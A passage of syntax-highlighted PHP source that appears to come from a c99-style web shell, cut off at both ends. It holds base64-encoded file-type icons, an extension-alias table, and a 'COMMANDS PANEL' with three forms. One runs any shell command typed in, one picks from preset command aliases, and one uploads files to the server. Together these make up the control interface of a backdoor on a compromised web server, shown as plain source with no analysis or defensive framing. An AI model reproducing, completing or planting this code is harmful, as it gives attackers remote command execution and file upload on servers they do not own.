    <span class="s2">&quot;ext_html&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz&quot;</span><span class="o">.</span>
    <span class="s2">&quot;c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P&quot;</span><span class="o">.</span>
    <span class="s2">&quot;KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR&quot;</span><span class="o">.</span>
    <span class="s2">&quot;ADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_jpg&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd&quot;</span><span class="o">.</span>
    <span class="s2">&quot;FxEAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_js&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH&quot;</span><span class="o">.</span>
    <span class="s2">&quot;k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs&quot;</span><span class="o">.</span>
    <span class="s2">&quot;a00AjYYBbc/o9HjNniUAADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_lnk&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO&quot;</span><span class="o">.</span>
    <span class="s2">&quot;NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG&quot;</span><span class="o">.</span>
    <span class="s2">&quot;MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5&quot;</span><span class="o">.</span>
    <span class="s2">&quot;NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf&quot;</span><span class="o">.</span>
    <span class="s2">&quot;1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ&quot;</span><span class="o">.</span>
    <span class="s2">&quot;ADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_log&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN&quot;</span><span class="o">.</span>
    <span class="s2">&quot;zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_php&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQAIABAAAAAP///ywAAAAAEAAQAAACJkQeoMua1tBxqLH37HU6arxZYLdIZMmd0Oqp&quot;</span><span class="o">.</span>
    <span class="s2">&quot;aGeyYpqJlRG/rlwAADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_pl&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo&quot;</span><span class="o">.</span>
    <span class="s2">&quot;GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_swf&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O&quot;</span><span class="o">.</span>
    <span class="s2">&quot;nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC&quot;</span><span class="o">.</span>
    <span class="s2">&quot;NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_tar&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF&quot;</span><span class="o">.</span>
    <span class="s2">&quot;HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD&quot;</span><span class="o">.</span>
    <span class="s2">&quot;UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p&quot;</span><span class="o">.</span>
    <span class="s2">&quot;uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg&quot;</span><span class="o">.</span>
    <span class="s2">&quot;GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd&quot;</span><span class="o">.</span>
    <span class="s2">&quot;HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB&quot;</span><span class="o">.</span>
    <span class="s2">&quot;u4tLAgEAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_txt&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ&quot;</span><span class="o">.</span>
    <span class="s2">&quot;SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7&quot;</span><span class="o">.</span>
    <span class="s2">&quot;UpPWG3Ig6Hq/XmRjuZwkAAA7&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_wri&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao&quot;</span><span class="o">.</span>
    <span class="s2">&quot;a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;ext_xml&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx&quot;</span><span class="o">.</span>
    <span class="s2">&quot;OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ&quot;</span><span class="o">.</span>
    <span class="s2">&quot;IQA7&quot;</span>
    <span class="p">);</span>
    <span class="c1">//Untuk optimalisasi ukuran dan kecepatan.</span>
    <span class="nv">$imgequals</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
      <span class="s2">&quot;ext_tar&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_tar&quot;</span><span class="p">,</span><span class="s2">&quot;ext_r00&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ace&quot;</span><span class="p">,</span><span class="s2">&quot;ext_arj&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bz2&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tbz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tbz2&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tgz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_uu&quot;</span><span class="p">,</span><span class="s2">&quot;ext_xxe&quot;</span><span class="p">,</span><span class="s2">&quot;ext_zip&quot;</span><span class="p">,</span><span class="s2">&quot;ext_cab&quot;</span><span class="p">,</span><span class="s2">&quot;ext_gz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_iso&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lha&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lzh&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pbk&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rar&quot;</span><span class="p">,</span><span class="s2">&quot;ext_uuf&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_php&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_php&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php3&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php4&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php5&quot;</span><span class="p">,</span><span class="s2">&quot;ext_phtml&quot;</span><span class="p">,</span><span class="s2">&quot;ext_shtml&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htm&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_jpg&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_jpg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_gif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_png&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jfif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jpe&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ico&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_html&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_html&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htm&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_avi&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_avi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mov&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mvi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mpg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mpeg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_wmv&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rm&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_lnk&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_lnk&quot;</span><span class="p">,</span><span class="s2">&quot;ext_url&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_ini&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_ini&quot;</span><span class="p">,</span><span class="s2">&quot;ext_css&quot;</span><span class="p">,</span><span class="s2">&quot;ext_inf&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_doc&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_doc&quot;</span><span class="p">,</span><span class="s2">&quot;ext_dot&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_js&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_js&quot;</span><span class="p">,</span><span class="s2">&quot;ext_vbs&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_cmd&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_cmd&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bat&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pif&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_wri&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_wri&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rtf&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_swf&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_swf&quot;</span><span class="p">,</span><span class="s2">&quot;ext_fla&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_mp3&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_mp3&quot;</span><span class="p">,</span><span class="s2">&quot;ext_au&quot;</span><span class="p">,</span><span class="s2">&quot;ext_midi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mid&quot;</span><span class="p">),</span>
      <span class="s2">&quot;ext_htaccess&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_htaccess&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htpasswd&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ht&quot;</span><span class="p">,</span><span class="s2">&quot;ext_hta&quot;</span><span class="p">,</span><span class="s2">&quot;ext_so&quot;</span><span class="p">)</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$getall</span><span class="p">)</span> <span class="p">{</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: image/gif&quot;</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-control: public&quot;</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">,</span><span class="nb">mktime</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2030</span><span class="p">)));</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-control: max-age=&quot;</span><span class="o">.</span><span class="p">(</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">7</span><span class="p">));</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)));</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$imgequals</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$img</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;}}</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$img</span> <span class="o">=</span> <span class="s2">&quot;small_unk&quot;</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$ext_tar</span><span class="p">))</span> <span class="p">{</span><span class="nv">$img</span> <span class="o">=</span> <span class="s2">&quot;ext_tar&quot;</span><span class="p">;}</span>
      <span class="k">echo</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$imgequals</span> <span class="k">as</span> <span class="nv">$a</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$b</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$d</span><span class="p">]))</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Warning! Remove </span><span class="se">\$</span><span class="s2">images[&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;]&amp;lt;br&amp;gt;&quot;</span><span class="p">);}}}}</span>
      <span class="nb">natsort</span><span class="p">(</span><span class="nv">$images</span><span class="p">);</span>
      <span class="nv">$k</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$images</span><span class="p">);</span>
      <span class="k">echo</span>  <span class="s2">&quot;&amp;lt;center&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$u</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$u</span><span class="o">.</span><span class="s2">&quot;:&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=&quot;</span><span class="o">.</span><span class="nv">$u</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
     
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="sd">/*** COMMANDS PANEL ***/</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">     </span>
<span class="x">    &amp;lt;table class=mainpanel&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;Command:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=act value=&quot;cmd&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=&quot;100&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=&quot;cmd_txt&quot; value=&quot;1&quot;&amp;gt; &amp;lt;input type=submit name=submit value=&quot;Execute&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;Quick Commands:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=act value=&quot;cmd&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=&quot;cmd_txt&quot; value=&quot;1&quot;&amp;gt;</span>
<span class="x">        &amp;lt;select name=&quot;cmd&quot;&amp;gt;</span>
<span class="x">        </span><span class="cp">&lt;?php</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cmdaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cmdaliases2</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &amp;lt;/select&amp;gt; &amp;lt;input type=submit name=submit value=&quot;Execute&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;Upload:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=act value=&quot;upload&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=hidden name=&quot;miniform&quot; value=&quot;1&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;file&quot; name=&quot;uploadfile&quot;&amp;gt; &amp;lt;input type=submit name=submit value=&quot;Upload&quot;&amp;gt; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$wdt</span><span class="o">.</span><span class="s2">&quot; Max size: &quot;</span><span class="o">.</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_max_filesize&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;B&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;PHP Filesystem:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="c1">###[ Acid ]</span>
<span class="c1">### ?&gt;</span>
    <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">set_arg</span><span class="p">(</span><span class="nx">txt1</span><span class="p">,</span><span class="nx">txt2</span><span class="p">)</span> <span class="p">{</span>
